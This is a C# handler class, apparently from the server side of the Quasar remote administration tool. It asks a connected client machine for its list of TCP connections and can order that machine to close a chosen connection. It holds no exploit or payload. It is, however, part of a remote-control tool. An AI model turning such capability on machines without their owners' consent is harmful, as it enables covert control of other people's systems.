using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Networking;

namespace Quasar.Server.Messages
{
    public class TcpConnectionsHandler : MessageProcessorBase<TcpConnection[]>
    {
        /// <summary>
        /// The client which is associated with this tcp connections handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Initializes a new instance of the <see cref="TcpConnectionsHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public TcpConnectionsHandler(Client client) : base(true)
        {
            _client = client;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetConnectionsResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetConnectionsResponse con:
                    Execute(sender, con);
                    break;
            }
        }

        /// <summary>
        /// Refreshes the current TCP connections.
        /// </summary>
        public void RefreshTcpConnections()
        {
            _client.Send(new GetConnections());
        }

        /// <summary>
        /// Closes a TCP connection of the client.
        /// </summary>
        /// <param name="localAddress">Local address.</param>
        /// <param name="localPort">Local port.</param>
        /// <param name="remoteAddress">Remote address.</param>
        /// <param name="remotePort">Remote port.</param>
        public void CloseTcpConnection(string localAddress, ushort localPort, string remoteAddress, ushort remotePort)
        {
            // a unique tcp connection is determined by local address + port and remote address + port
            _client.Send(new DoCloseConnection
            {
                LocalAddress = localAddress,
                LocalPort = localPort,
                RemoteAddress = remoteAddress,
                RemotePort = remotePort
            });
        }

        private void Execute(ISender client, GetConnectionsResponse message)
        {
            OnReport(message.Connections);
        }

        protected override void Dispose(bool disposing)
        {
        }
    }
}
